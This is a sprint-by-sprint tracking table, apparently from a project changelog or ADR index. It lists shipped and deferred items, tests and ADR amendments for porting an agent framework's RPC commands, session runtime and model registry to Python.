| `tests/rpc/test_rpc_mode_switch_fork_clone.py` (NEW — 3 handler integration tests + arity / dispatch wiring + rebind invocation count + leaf_id pre-capture ordering + W4 MINOR-3 rewrite) | shipped | 0079 |
| `tests/rpc/test_rpc_mode_new_session_parent.py` (NEW — Sprint 6d stub removal regression; asserts `parent_session_path` actually persists) | shipped | 0079 |
| Cascade pin allowlist updates — `test_phase_4_4`/`4_6`/`4_8`/`4_9`/`4_10`/`4_11`/`4_12_strict_superset.py` count cascades to 29 supported / 0 deferred | shipped | 0080 |
| 6h₄b test migrations — `tests/runtime/test_agent_session_runtime.py` + `tests/rpc/test_rpc_mode_*.py` drop `_apply_for_test` usage and migrate to real `switch_session` (P-331) | shipped | 0079 |
| ADR-0034 amendment — Sprint 6h₄c PHASE 4 RPC CLOSURE row (3 of 29 RpcCommand variants land + cumulative 29 of 29) | shipped | 0034 |
| ADR-0076 amendment — Sprint 6h₄c PHASE 4 RPC CLOSURE note + P-323 line-citation correction (`:528-557` → verified `:563-569` / `:571-577` / `:579-589`) | shipped | 0076 |
| ADR-0078 amendment — Sprint 6h₄c foundation → wiring complete note + P-323 line-citation correction (`:566` / `:574` / `:586` → verified `:563-569` / `:571-577` / `:579-589`) | shipped | 0078 |
| P-307 `session_shutdown` extension event emit from `AgentHarness.dispose()` | deferred to Sprint 6h₅+ | 0080 |
| P-308 Real `session_before_switch` / `session_before_fork` extension cancel hooks (currently `_emit_before_switch` / `_emit_before_fork` no-op `False`) | deferred to Sprint 6h₅+ | 0080 |
| P-313 `HarnessFactory` 4-field refresh | **DROPPED** (harness-rebuild encapsulates services + diagnostics + model_fallback_message via factory closure; redundant for Aelix) | 0080 |
| P-314 `with_session: Callable[[ReplacedSessionContext], Awaitable[None]] \| None` 2-stage callback | deferred to Sprint 6h₅+ | 0080 |
| P-315 `set_rebind_session` / `set_before_session_invalidate` optional-cb signature widening | deferred to Sprint 6h₅+ | 0080 |
| `assertSessionCwdExists` Pi parity (cwd-on-disk validation before session swap) | deferred to Sprint 6h₅+ | 0080 |
| `previousSessionFile` / `sessionStartEvent` tracking (extension event payload) | deferred to Sprint 6h₅+ | 0080 |
| Pi `forkFrom` cross-cwd import (no RPC wire today) | deferred to Sprint 6h₅+ | 0080 |
| Pi `setup` callback in `new_session` | deferred to Sprint 6h₅+ | 0080 |
| `import_from_jsonl` real runtime body (no RPC wire today — Pi TUI `/import` doesn't go through dispatch) | deferred to Sprint 6h₅+ | 0080 |

### Sprint 6h₄b sub-table (Phase 4.12 closure — FOUNDATION ONLY)

Counts UNCHANGED at **26 supported / 3 deferred / 29 total**. NO new
RPC commands wired in this sprint — the foundation is `AgentSessionRuntime`
+ the `rebindSession` seam. Sprint 6h₄c (ADR-0078) wires
`switch_session` / `fork` / `clone` on top of this foundation.

| Item | Status | Owner ADR |
|---|---|---|
| `aelix_agent_core.runtime` package (NEW) — `aelix_agent_core.runtime.__init__` re-exports `AgentSessionRuntime` / `AgentSessionRuntimeDiagnostic` / `HarnessFactory` / `RuntimeReplaceResult` | shipped | 0077 |
| `aelix_agent_core.runtime._types` (NEW) — `HarnessFactory: Callable[[Session], Awaitable[AgentHarness]]` type alias + `RuntimeReplaceResult` frozen `(cancelled, selected_text)` dataclass + `AgentSessionRuntimeDiagnostic` frozen `(code, message)` dataclass | shipped | 0077 |
| `aelix_agent_core.runtime.agent_session_runtime.AgentSessionRuntime` (NEW — Pi `agent-session-runtime.ts:67-374` port; 5 read-only getters `harness` / `session` / `cwd` / `diagnostics` / `model_fallback_message` + 7 public methods + private `_apply` / `_teardown_current` / `_finish_session_replacement` replace seam + test-only `_apply_for_test`) | shipped | 0077 |
| Harness-rebuild pattern (P-302 BINDING — preserves `_state.session_id` + action bindings + merged tools + cached session-name invariants vs. Pi session-swap which has none of those captures) | shipped | 0077 |
| `rebind_session` closure in `rpc_mode.py` (P-303 — Pi `rpc-mode.ts:310-349` subset: `_Capture` cell + re-subscribe only; `bindExtensions` / `commandContextActions` waveform deferred to 6h₄c) | shipped | 0077 |
| `run_rpc_mode` signature shim accepts optional `runtime_host: AgentSessionRuntime \| None = None` + `harness_factory: HarnessFactory \| None = None` (P-309 — backward-compat for 26 already-wired handlers) | shipped | 0077 |
| `_make_passthrough_runtime(harness, harness_factory)` helper with `_noop_factory` that RAISES `RuntimeError` (W4 LOW-3 — fail loudly on accidental replace instead of silently re-binding to the same stale harness) | shipped | 0077 |
| 4 stubbed public replace APIs (`switch_session` / `new_session` / `fork` / `import_from_jsonl`) raise `NotImplementedError("Sprint 6h₄c — ADR-0078")` (P-310 — async signatures preserved for 6h₄c body fill) | shipped | 0077 |
| `_emit_before_switch` / `_emit_before_fork` async no-op stubs return `False` (P-308 — Aelix has no `session_before_switch` / `session_before_fork` hook events today; real cancel surface defers to 6h₄c+) | shipped | 0077 |
| `set_rebind_session` (P-305 — Pi `:99-101` fire-and-await) + `set_before_session_invalidate` (P-307 — Pi `:111-113` sync) seam setters | shipped | 0077 |
| `dispose()` calls `before_session_invalidate` then `await harness.dispose()` (P-307 — Pi `:366-373` order preserved; `session_shutdown` emit gap recorded in ADR-0078 carry-forward) | shipped | 0077 |
| Diagnostics list copied on constructor + getter (P-318 — Aelix-additive safety; Pi takes reference) | shipped | 0077 |
| DEFERRED owner rebrand 0076 → 0078 in `DEFERRED_COMMANDS` (W4 MEDIUM-1 + W5 P-312 + W5 P-319 — per spec §D.5; rebrand applied with cascade pin allowlist updates) | shipped | 0078 |
| Cascade pin allowlist updates — `test_phase_4_4`/`4_9`/`4_10`/`4_11_strict_superset.py` extended with ADR-0078 prefix | shipped | 0078 |
| Closure pin `tests/pi_parity/test_phase_4_12_strict_superset.py` (26 / 3 / 29 unchanged + DEFERRED owners cite ADR-0078 ONLY + 15 Pi member line-range pins + runtime class shape pins + frozen dataclass field locks + `run_rpc_mode` signature pin + `_make_passthrough_runtime` import pin + Pi fixture immutability + architecture decision = `"harness-rebuild"`) | shipped | 0078 |
| `tests/pi_parity/fixtures/pi_agent_session_runtime_734e08e.json` (W0 fixture — 15 Pi member line-ranges + architecture decision = `"harness-rebuild"` + P-302 / P-307 / P-308 documented notes) | shipped | 0077 |
| `tests/runtime/test_agent_session_runtime.py` (29+ unit tests — constructor + 5 getters + 2 seam setters + 4 stub returns + `_apply_for_test` replace seam exercise + dispose order + frozen dataclass locks + P-306 `_state.session_id` invariant test added in W6 per W4 NIT-2) | shipped | 0077 |
| `tests/rpc/test_rpc_mode_rebind.py` (rebind closure integration — subscription rebalance + listener-count balance per replace + smoke test for `runtime_host` kwarg renamed per W4 NIT-1) | shipped | 0077 |
| `tests/rpc/test_rpc_mode_runtime_shim.py` (NEW — 7 P-309 / P-311 back-compat regression tests added in W6 per W5 P-311 MUST-FIX 2: bare-harness call works + passthrough identity + raising no-op factory + dispatch reads `capture.harness` + `runtime_host` harness wins + wired handlers still callable + 3 deferred return ADR-0078 in error string) | shipped | 0078 |
| `tests/rpc/test_rpc_mode_deferred.py` + `test_rpc_mode_stdin_stdout.py` extended ADR allowlists for ADR-0078 rebrand | shipped | 0078 |
| ADR-0034 amendment — Sprint 6h₄b row (foundation sprint, counts unchanged) | shipped | 0034 |
| ADR-0076 amendment — Sprint 6h₄b foundation update note appended (DEFERRED ownership rebrands ADR-0076 → ADR-0078) | shipped | 0076 |
| 3 session-tree commands (switch_session / fork / clone) — wire on 6h₄b runtime foundation | deferred to Sprint 6h₄c | 0078 |
| Real `_emit_before_switch` / `_emit_before_fork` extension cancel hooks (P-308 fill-in) | deferred to Sprint 6h₄c | 0078 |
| P-307 `session_shutdown` extension event emit from `AgentHarness.dispose()` | deferred to Sprint 6h₄c | 0078 |
| P-313 widen `HarnessFactory` for full Pi field refresh (`_services` / `_diagnostics` / `_modelFallbackMessage`) | deferred to Sprint 6h₄c | 0078 |
| P-314 `with_session: Callable[[ReplacedSessionContext], Awaitable[None]] \| None = None` 2-stage callback | deferred to Sprint 6h₄c | 0078 |
| P-315 `set_rebind_session` / `set_before_session_invalidate` optional-cb signature widening | deferred to Sprint 6h₄c | 0078 |

### Sprint 6h₄a sub-table (Phase 4.11 closure)

| Item | Status | Owner ADR |
|---|---|---|
| `aelix_agent_core.harness._fork_point.ForkPointInfo` (NEW — `@dataclass(frozen=True)` with fields `(entry_id: str, text: str)` for Pi inline anonymous `Array<{entryId, text}>` shape, P-295) | shipped | 0075 |
| `AgentHarness.get_user_messages_for_forking()` (Pi parity `agent-session.ts:2867-2900` `getUserMessagesForForking`; async per P-294 — Aelix `Session.get_entries()` is async) | shipped | 0075 |
| `AgentHarness.get_last_assistant_text()` (Pi parity `agent-session.ts:3063-3070` `getLastAssistantText`; reverse-walk + aborted-empty filter per P-297) | shipped | 0075 |
| `AgentHarness._extract_user_message_text` (Pi parity `agent-session.ts:2887-2898`; list-only walk with defensive string branch per P-296 — unreachable under Aelix type system but kept byte-for-byte with Pi source) | shipped | 0075 |
| 2 RPC handlers (`_handle_get_fork_messages` / `_handle_get_last_assistant_text`) + camelCase wire serializer (Pi-shape `[{"entryId": ..., "text": ...}]`) + dispatch entries | shipped | 0075 |
| `_handle_get_last_assistant_text` Pi key-omission parity — `data = {"text": text} if text is not None else {}` (P-298 SYNTHESIS — matches Pi `JSON.stringify({text: undefined}) → {}` and existing Sprint 6h₃ `_session_stats_to_dict` undefined-skip pattern) | shipped | 0075 |
| Aborted-empty filter `stop_reason == "aborted" AND len(content) == 0` (P-297 — Pi `agent-session.ts:3063-3070`) | shipped | 0075 |
| Line citation correction — `rpc-mode.ts:591-594` / `:596-599` (W0 verified; ADR-0074 had estimated `:563-566`/`:568-571`; drift captured per P-293) | shipped | 0075 / 0076 |
| `tests/pi_parity/test_phase_4_11_strict_superset.py` closure pin (26 supported / 3 deferred + ForkPointInfo shape + Pi-camelCase wire + async harness method + aborted-empty filter + Pi key-omission parity + W0-verified line numbers) | shipped | 0076 |
| `tests/pi_parity/test_phase_4_4_strict_superset.py` strengthening (Sprint 6d closure pin: SUPPORTED 24 → 26, DEFERRED 5 → 3) | shipped | 0076 |
| `tests/pi_parity/test_phase_4_6/4_8/4_9/4_10_strict_superset.py` count cascade updates (SUPPORTED 24 → 26, DEFERRED 5 → 3) | shipped | 0076 |
| `tests/rpc/test_rpc_mode_deferred.py` + `test_rpc_mode_stdin_stdout.py` count updates (5 → 3 deferred) | shipped | 0076 |
| `tests/pi_parity/fixtures/pi_session_navigation_734e08e.json` (W0 fixture — verified Pi handler bodies at `:591-594` / `:596-599`) | shipped | 0075 |
| ADR-0034 amendment — Sprint 6h₄a Phase 4.11 partition (2 of 29 + 26 of 29 cumulative) | shipped | 0034 |
| ADR-0074 amendment — line-citation correction note (P-293 — `:563-566`/`:568-571` → `:591-594`/`:596-599`) | shipped | 0074 |
| 3 session-tree commands (switch_session / fork / clone) | deferred to Sprint 6h₄b | 0076 |
| Pi `AgentSessionRuntime` full port (runtimeHost.switchSession / fork / fork({position: "at"})) | deferred to Sprint 6h₄b | 0076 |
| `SessionManager.getLeafId()` for `clone` command | deferred to Sprint 6h₄b | 0076 |
| `rebindSession()` seam (P-126 Sprint 6f multi-sprint carry-forward — Sprint 6f → 6h₁ → 6h₂ → 6h₃ → 6h₄a accumulation) | deferred to Sprint 6h₄b | 0076 |
| `_get_context_usage_safe` real implementation (P-282 carry-forward from ADR-0074) | deferred to Sprint 6h₄b+ | 0076 |
| Live `session_id` read via session manager (P-291 carry-forward from ADR-0074) | deferred to Sprint 6h₄b+ | 0076 |
| Pi-source-grep verification tooling (P-286 carry-forward from ADR-0074) | deferred to Sprint 6h₄b+ | 0076 |
| Pi HTML visual fidelity + session-tree entry source (P-280 carry-forward from ADR-0074) | deferred to Sprint 6h₅ | 0076 |

### Sprint 6h₃ sub-table (Phase 4.10 closure)

| Item | Status | Owner ADR |
|---|---|---|
| `aelix_agent_core.harness._session_stats` (NEW — `SessionStats` 10-field dataclass + `SessionStatsTokens` 5-field sub-shape + `aggregate_session_stats` pure-function aggregator + `_read` dict-fallback helper) | shipped | 0073 |
| `aelix_coding_agent._export_html` (NEW — minimal HTML5 emitter with per-role sections + Pi-shape default `aelix-session-<basename>.html` cwd-relative path) | shipped | 0073 |
| `AgentHarness.get_session_stats()` + `AgentHarness.export_to_html()` methods (Pi parity + harness-side precondition raises for in-memory / missing session) | shipped | 0073 |
| 2 RPC handlers (`_handle_get_session_stats` / `_handle_export_html`) + Pi-shape `_session_stats_to_dict` (W6 P-275 BLOCKING — Pi-shape `contextUsage {tokens, contextWindow, percent}`) | shipped | 0073 |
| Aggregator `totalMessages = len(messages)` (W6 P-276 BLOCKING — matches Pi `agent-session.ts:2935` `state.messages.length`) | shipped | 0073 |
| Pi error parity on `export_to_html` (W6 P-279 MAJOR — `export-html.ts:242-248` raises on in-memory / empty session) | shipped | 0073 |
| Pi-shape default `outputPath = aelix-session-<basename>.html` cwd-relative (W6 P-281 MAJOR — `export-html.ts:273-277`) | shipped | 0073 |
| Aggregator dict-shape `usage` fallback via `_read` helper (W6 P-283) | shipped | 0073 |
| Drop dead `hasattr(session, "messages")` branch (W6 W4 HIGH P-292 — pyright regression fix) | shipped | 0073 |
| Drop `getattr(cmd, "output_path", None)` in `_handle_export_html` (W6 W4 MEDIUM-1) | shipped | 0073 |
| Drop `path.parent` truthiness tautology in `_export_html` (W6 W4 MEDIUM-2) | shipped | 0073 |
| Line citation corrections (W6 P-277/P-278/P-286 — `rpc-mode.ts:553-561` + `agent-session.ts:2901-2945` in 7+ files: rpc_mode.py docstrings + _session_stats.py module docstring + harness/core.py method docstrings + closure pin + Pi fixture + spec) | shipped | 0073 |
| `tests/pi_parity/test_phase_4_10_strict_superset.py` closure pin | shipped | 0074 |
| `tests/pi_parity/test_phase_4_4_strict_superset.py` strengthening (Sprint 6d closure pin: SUPPORTED 22 → 24, DEFERRED 7 → 5) | shipped | 0074 |
| `tests/pi_parity/test_phase_4_6_strict_superset.py` / `4_8` / `4_9` count updates (SUPPORTED 22 → 24, DEFERRED 7 → 5) | shipped | 0074 |
| ADR-0034 amendment — Sprint 6h₃ Phase 4.10 partition (2 of 29 + 24 of 29 cumulative) | shipped | 0034 |
| Pi `AgentSessionRuntime` port (runtimeHost.switchSession / fork) | deferred to Sprint 6h₄ | 0074 |
| `SessionManager.getLeafId` for `clone` command | deferred to Sprint 6h₄ | 0074 |
| `rebindSession` seam (P-126 Sprint 6f carry-forward) | deferred to Sprint 6h₄ | 0074 |
| 5 session-tree commands (switch_session / fork / clone / get_fork_messages / get_last_assistant_text) | deferred to Sprint 6h₄ | 0074 |
| `_get_context_usage_safe` real implementation (P-282 — model registry + per-turn tracking) | deferred to Sprint 6h₄ | 0074 |
| Live `session_id` read via session manager (P-291) | deferred to Sprint 6h₄ | 0074 |
| Pi-source-grep verification tooling (P-286) | deferred to Sprint 6h₄ | 0074 |
| Pi HTML visual fidelity + session-tree entry source (P-280) | deferred to Sprint 6h₅ | 0074 |

### Sprint 6h₂ sub-table (Phase 4.9 closure)

| Item | Status | Owner ADR |
|---|---|---|
| 9 RPC handlers (steer / follow_up / cycle_thinking_level / set_steering_mode / set_follow_up_mode / set_auto_compaction / set_auto_retry / abort_retry / abort_bash) | shipped | 0071 |
| Harness setters (5 new + 4 new AgentState fields: `auto_compaction_enabled` / `auto_retry_enabled` / `retry_aborted` / `bash_aborted`) | shipped | 0071 |
| `AgentHarness.auto_compaction_enabled` + `AgentHarness.auto_retry_enabled` public properties | shipped | 0071 |
| `_MessageQueue.set_mode(mode)` helper (W6 P-265 BLOCKING — defensive runtime validation) | shipped | 0071 |
| `cycle_thinking_level` `supportsThinking()` guard (W6 P-254 BLOCKING — `!!this.model?.reasoning` short-circuit) | shipped | 0071 |
| `images` keyword-only marker on `AgentHarness.steer` / `AgentHarness.follow_up` (W6 P-263 MAJOR) | shipped | 0071 |
| Strict `_decode_images` (camelCase only + required-field validation, W6 P-262 BLOCKING — drops snake_case acceptance and silent-empty-string coercion) | shipped | 0071 |
| `RpcSessionState.auto_retry_enabled` field (12 → 13) + `_handle_get_state` real source (W6 P-264 BLOCKING) | shipped | 0071 |
| `typing.cast(QueueMode, mode)` in `set_steering_mode` / `set_follow_up_mode` (W4 LOW-3) | shipped | 0071 |
| `build_dispatch_table` docstring + deferred handler error string updates (W4 NIT) | shipped | 0071 |
| Line citation corrections — 14 docstrings + W0 fixture cite W5-audited `rpc-mode.ts:483-547` + `agent-session.ts` method sites (W6 P-258 BLOCKING) | shipped | 0071 |
| `tests/pi_parity/test_phase_4_9_strict_superset.py` closure pin (28 tests including 11 W6 regression pins) | shipped | 0072 |
| `tests/pi_parity/test_phase_4_4_strict_superset.py` strengthening (12 → 13 `RpcSessionState` field count + Pi fixture extension) | shipped | 0072 |
| `tests/pi_parity/test_phase_4_6_strict_superset.py` W4 NIT renames (count-free names) | shipped | 0072 |
| `tests/pi_parity/fixtures/pi_rpc_9_commands_734e08e.json` W6 P-258 line-number corrections (528-635 → 483-547) | shipped | 0072 |
| ADR-0034 amendment — Sprint 6h₂ Phase 4.9 partition (9 of 29 + 22 of 29 cumulative) | shipped | 0034 |
| Pi `SettingsManager` (`coding-agent/src/core/settings-manager.ts`) disk persistence (P-255 / P-256) | deferred to Sprint 6h₃ | 0072 |
| Pi `agent-harness.ts` retry loop with `AbortController` (P-257) | deferred to Sprint 6h₃ | 0072 |
| `queue_update` event payload Pi-shape `string[]` vs Aelix `list[UserMessage]` (P-259) | deferred to Sprint 6h₃ | 0072 |
| `steer` / `follow_up` Pi-side `_throwIfExtensionCommand` + `_expandSkillCommand` + `expandPromptTemplate` expanders (P-260) | deferred to Sprint 6h₃ | 0072 |
| `cycle_thinking_level` sync vs async asymmetry (P-266 — documented Pi divergence; Aelix `set_thinking_level` is async) | tracked | 0072 |
| Spec citation tweak — `SettingsManager` upstream source (P-267) | deferred to Sprint 6h₃ | 0072 |
| 5 session-tree commands (switch_session / fork / clone / get_fork_messages / get_last_assistant_text) | deferred to Sprint 6h₃ | 0072 |
| 2 session-inspection commands (get_session_stats / export_html) | deferred to Sprint 6h₃ | 0072 |

### Sprint 6h sub-table (Phase 4.8 closure)

| Item | Status | Owner ADR |
|---|---|---|
| `aelix_agent_core.harness.prompt_templates` (Pi port of `prompt-templates.ts` — 5 functions + 4 types, P-216) | shipped | 0069 |
| `aelix_agent_core.harness.skills` (Pi port of `skills.ts` — 2 functions + 4 types + `.gitignore`/`.ignore`/`.fdignore` honouring via pathspec, P-217) | shipped | 0069 |
| `aelix_agent_core.harness._frontmatter` (shared YAML frontmatter parser — W4 m4) | shipped | 0069 |
| `aelix_agent_core.harness._extension_runner.ExtensionRunner` + `ResolvedCommand` (Pi `runner.ts:512-551` with `{name}:{N}` disambiguation — W6 P-224 BLOCKING) | shipped | 0069 |
| `aelix_agent_core.harness.core.AgentHarness` wires `extension_runner` / `prompt_templates` / `skills` properties + 2 setters | shipped | 0069 |
| `aelix_coding_agent.extensions.api.ExtensionSourceInfo` Pi `{path, scope, origin}` field extension (W6 P-225 BLOCKING) | shipped | 0069 |
| `aelix_coding_agent.rpc.rpc_mode._handle_get_commands` (Pi `rpc-mode.ts:622-653` — 3-source aggregation + Pi-shape `sourceInfo` wire per W6 P-225 + `invocation_name` per W6 P-224) | shipped | 0069 |
| `PromptTemplate.description` / `content` default `""` (W6 P-226 MAJOR) | shipped | 0069 |
| YAML parse failures surface error text in `parse_failed` diagnostic (W6 P-233 MINOR) | shipped | 0069 |
| Case-insensitive `.md` extension strip via `name.lower().endswith(".md")` (W6 P-234 MINOR) | shipped | 0069 |
| `pi_get_commands_734e08e.json` fixture name-regex text correction (W6 P-227 MINOR) | shipped | 0069 / 0070 |
| `disable-model-invocation` tautological test → real sentinel (integer `1` is truthy but not `is True`) (W6 W4 m2) | shipped | 0069 |
| `PyYAML>=6.0` + `pathspec>=0.12` added to `aelix-agent-core` pyproject (P-222) | shipped | 0069 |
| `tests/pi_parity/test_phase_4_8_strict_superset.py` closure pin (22+ tests covering W2 surface + W6 must-fix regressions) | shipped | 0070 |
| `tests/pi_parity/test_phase_4_4_strict_superset.py` strengthening (Sprint 6d closure pin updated: SUPPORTED 12 → 13, DEFERRED 17 → 16) | shipped | 0070 |
| `tests/pi_parity/test_phase_4_6_strict_superset.py` strengthening (Sprint 6f closure pin updated: SUPPORTED 12 → 13, DEFERRED 17 → 16) | shipped | 0070 |
| `tests/harness/test_extension_runner.py` (Pi disambiguation regression — 3-way collision + explicit-disambiguation collision + source_info forward + None fallback) | shipped | 0069 |
| `tests/harness/test_harness_session_aggregation.py` (harness-side aggregation hooks + defensive copy invariant) | shipped | 0069 |
| `tests/rpc/test_rpc_mode_get_commands.py` (Pi-shape sourceInfo wire regression + 3-source aggregation in Pi insertion order + `"skill:"` prefix) | shipped | 0069 |
| `tests/harness/test_frontmatter.py` + `test_prompt_templates.py` + `test_skills.py` (unit coverage for all 5 ports + 2 new types) | shipped | 0069 |
| ADR-0034 amendment — Sprint 6h₁ prompt-templates + skills + `get_commands` row | shipped | 0034 |
| 16 remaining RPC commands (steer / follow_up / cycle_thinking_level / queue / auto / abort_bash / session inspection / session tree / extension UI bridge) | deferred to Sprint 6h₂ | 0070 |
| Workspace-scoped model selection (`cycle_model.isScoped: true` path) | deferred to Sprint 6h₂ | 0070 |
| `applyProviderConfig` for `register_provider.config.models` | deferred to Sprint 6h₂ | 0070 |
| `enableGitHubCopilotModel` POST automation | deferred to Sprint 6h₂ | 0070 |
| `loadSourcedPromptTemplates` / `loadSourcedSkills` source-tagged variants | deferred to Sprint 6h₂ | 0070 |
| `image-models.ts` + `image-models.generated.ts` parallel image-model registry | deferred to Sprint 6h₃ | 0070 |
| Typed `Model.compat` discriminated union | deferred to Sprint 6h₃ | 0070 |
| pathspec `gitwildmatch` → `gitignore` flavour cutover when pathspec 0.13 lands | tracked | 0070 |
| W4 m3 (unbounded recursion under filesystem loops — Pi has the same behaviour; Aelix matches) | closed | 0070 |
| W4 NIT-2..NIT-5 (cosmetic) | closed | 0070 |

### Sprint 5b sub-table (Phase 3.2 closure)

| Item | Status | Owner ADR |
|---|---|---|
| 7 built-in coding tools | shipped | 0042 |
| `create_coding_tools` / `create_read_only_tools` / `create_all_tools` factories | shipped | 0042 |
| `input` emit site (`AgentHarness.prompt()` head) | shipped | 0042 |
| `user_bash` emit site (minimal CLI `!/!!` parser) | shipped | 0042 |
| `resources_discover` emit site (`bootstrap` / `reload_resources`) | shipped | 0042 |
| 8 tool-typed `ToolCallHookEvent` variants | shipped | 0043 |
| 8 symmetric `ToolResultHookEvent` variants | shipped | 0043 |
| `make_tool_call_event` / `make_tool_result_event` factories | shipped | 0043 |
| `is_tool_call_event_type` / `is_tool_result_event_type` narrow helpers | shipped | 0043 |
| `ExtensionCommandContext` (4 bound + 2 raise) | shipped | 0042 |
| Sprint 5a ergonomics — cached session name + `_pending_tasks` GC + `_ensure_loop` | shipped | 0042 |
| 4 wired stubs (`send_message` / `send_user_message` / `append_entry` / `get_commands`) | shipped | 0042 |
| `tests/pi_parity/test_phase_3_2_strict_superset.py` closure pin | shipped | 0044 |
| DEFERRED_ALLOWLIST Phase-4-only (3 provider entries) | shipped | 0044 |

### Sprint 6g sub-table (Phase 4.7 closure)

| Item | Status | Owner ADR |
|---|---|---|
| `aelix_ai.streaming.KnownProvider` Literal (32 strings, Pi semantic order verbatim from `types.ts:23-55` — P-208 MAJOR fix) | shipped | 0067 |
| `aelix_ai.streaming.Model.compat: dict[str, Any] \| None` passthrough field (P-200) | shipped | 0067 / 0064 |
| `aelix_ai.models_generated.json` full Pi catalog (32 providers / 942 models) | shipped | 0067 |
| `aelix_ai.models_generated._load_catalog` fail-fast on Pi-required fields (P-209 MAJOR fix) | shipped | 0067 |
| `aelix_coding_agent.core.defaults.DEFAULT_THINKING_LEVEL = "medium"` (P-205 BLOCKING fix — was incorrectly `"off"` in Sprint 6g₁ ship) | shipped | 0067 |
| `aelix_coding_agent.core.defaults.is_valid_thinking_level` (Pi `cli/args.ts::isValidThinkingLevel`) | shipped | 0067 |
| `aelix_coding_agent.core.model_resolver` (7 functions + 3 helpers ported from Pi `model-resolver.ts:1-637` — actual 637 LOC, NOT 439 per P-215) | shipped | 0067 |
| `DEFAULT_MODEL_PER_PROVIDER` (32-row map from Pi `:14-47`) | shipped | 0067 |
| `RestoreModelResult` frozen dataclass mirrors Pi `restoreModelFromSession` return shape (P-206 MAJOR fix) | shipped | 0067 |
| `_glob_match_pi_minimatch` per-segment helper for Pi `minimatch` `/`-boundary semantics (P-207 MAJOR fix) | shipped | 0067 |
| `_openai_compat.get_compat` catalog `Model.compat` merge wiring confirmed (P-210 MAJOR — spec §J text was stale at ship) | shipped | 0067 |
| `tests/pi_parity/test_phase_4_7_strict_superset.py` closure pin (32 tests — KnownProvider order + DEFAULT_THINKING_LEVEL + Model.compat + RestoreModelResult + glob /-boundary + catalog 32 providers + canonical models) | shipped | 0068 |
| `tests/coding_agent/core/test_defaults.py` + `test_model_resolver.py` (49 tests — 7 functions + 3 helpers + integration with real ModelRegistry) | shipped | 0067 |
| `tests/providers/test_openai_compat_with_catalog.py` (3 P-210 regressions — zai/glm-5v-turbo + zai/glm-4.5-air partial dict + baseline-vs-merged comparison) | shipped | 0067 |
| `tests/test_models_generated.py::test_load_catalog_raises_keyerror_on_missing_required_field` (P-209 regression) | shipped | 0067 |
| `tests/pi_parity/fixtures/pi_model_resolver_734e08e.json` (W0 fixture — line refs corrected per P-215; `default_thinking_level` corrected to `"medium"` per P-205) | shipped | 0067 / 0068 |
| ADR-0034 amendment — Sprint 6g₁ model-resolver port + full catalog + KnownProvider + Model.compat | shipped | 0034 |
| ADR-0064 amendment — Sprint 6g₁ adds `compat` field (6 additive Model fields total) | shipped | 0064 |
| Typed `Model.compat` discriminated union (`OpenAICompletionsCompat \| OpenAICodexResponsesCompat \| …`) | deferred to Sprint 6g₂ | 0068 |
| `get_commands` RPC command + prompt-templates + skills surface | deferred to Sprint 6g₂ | 0068 |
| 16 remaining RPC commands (queue / session tree / extension UI bridge / auto modes / retry / etc.) | deferred to Sprint 6g₂ | 0068 |
| `image-models.ts` + `image-models.generated.ts` parallel image-model registry | deferred to Sprint 6g₃ | 0068 |
| `chalk`-colored CLI output | deferred to Sprint 6h / Phase 5 TUI | 0067 |
| Workspace-scoped model selection (`isScoped: true` path) | deferred to Sprint 6g₂ | 0068 |
| `applyProviderConfig` for `register_provider.config.models` + `models.json` schema | deferred to Sprint 6g₂ | 0068 |
| `enableGitHubCopilotModel` POST automation | deferred to Sprint 6g₂ | 0068 |
| `Model.knowledgeCutoff` / `Model.releaseDate` (Pi-untyped runtime additions) | deferred — Pi types catch up | 0068 |
| W4 NIT-2..NIT-5 (cosmetic) | deferred to Sprint 6h | 0068 |

### Sprint 6f sub-table (Phase 4.6 closure)

| Item | Status | Owner ADR |
|---|---|---|
| `aelix_ai.streaming.ModelCost` (frozen per-million rate) + `Cost = ModelCost` back-compat alias for Sprint 6a/6b callers (P-169) | shipped | 0064 |
| `aelix_ai.streaming.UsageCost` (mutable resolved cost, mirrors Pi `Usage.cost` in-place mutation) + `Usage` dataclass (P-168) | shipped | 0064 |
| Pi `Model.thinking_level_map: dict[str, str \| int \| None] \| None` (P-165) | shipped | 0064 |
| Pi `Model.max_tokens` + `Model.context_window` (plain int, P-166) | shipped | 0064 |
| Pi `Model.headers: dict[str, str] \| None` + `_model_to_dict` RPC wire (P-167 / P-178 MAJOR) | shipped | 0064 |
| `aelix_ai.models` 7 Pi-parity helpers (`get_all_models` / `get_models_for_provider` / `get_model_by_id` / `find_model_with_provider` / `get_default_model` / `coerce_thinking_level` + `EXTENDED_THINKING_LEVELS` 6-value Pi parity) | shipped | 0064 / 0066 |
| `aelix_ai.models_generated` 13-model seed catalog (Anthropic + OpenAI + GitHub Copilot — ≥10 models / ≥3 providers, P-174) | shipped | 0064 |
| `aelix_coding_agent.model_registry.ModelRegistry` (14 methods + `create` / `in_memory` factories) | shipped | 0065 |
| `ResolvedRequestAuth` discriminated union (`ok: bool` discriminator + `api_key` + `auth_header: bool` P-180 Pi-strict bool, NOT str + `error`) | shipped | 0065 |
| `ProviderConfigInput` dataclass (Sprint 6f₁ minimum shape; full `models.json` schema deferred to Sprint 6g) | shipped | 0065 |
| `_load_error` cleared at top of every `_load_models`; multi-provider failures newline-joined (P-175) | shipped | 0065 |
| `is_using_oauth` trusts AuthStorage discriminator exclusively (drops legacy `get_oauth_provider` extra guard, P-176) | shipped | 0065 |
| `asyncio.get_event_loop()` → `asyncio.get_running_loop()` migration (P-184, Python 3.12 deprecation) | shipped | 0065 |
| Harness `current_model` property + `set_current_model` writes `_state.model` directly (P-187 — no override layer) | shipped | 0065 |
| Harness `has_configured_auth` enforcement before `set_model` swap (P-172 BLOCKING) | shipped | 0065 |
| `cycle_model` wrap-around no-op when `len(models) <= 1` (P-170 BLOCKING) + `thinking_level` persistence + `coerce_thinking_level` clamp (P-171 BLOCKING / P-182) | shipped | 0065 |
| `aelix_coding_agent.rpc.rpc_mode` `set_model` / `cycle_model` / `get_available_models` handlers (moved from `DEFERRED_COMMANDS` → `SUPPORTED_COMMANDS`) | shipped | 0058 / 0066 |
| `tests/pi_parity/test_phase_4_6_strict_superset.py` closure pin (7 helpers + 14 ModelRegistry methods + 17 deferred / 12 supported + seed catalog + `Model.headers` + `current_model` reads `_state.model`) | shipped | 0066 |
| `tests/pi_parity/test_phase_4_4_strict_superset.py` strengthening (Sprint 6d closure pin updated: SUPPORTED 9 → 12, DEFERRED 20 → 17, P-181) | shipped | 0066 |
| `tests/pi_parity/fixtures/pi_model_registry_734e08e.json` Pi-parity fixture | shipped | 0066 |
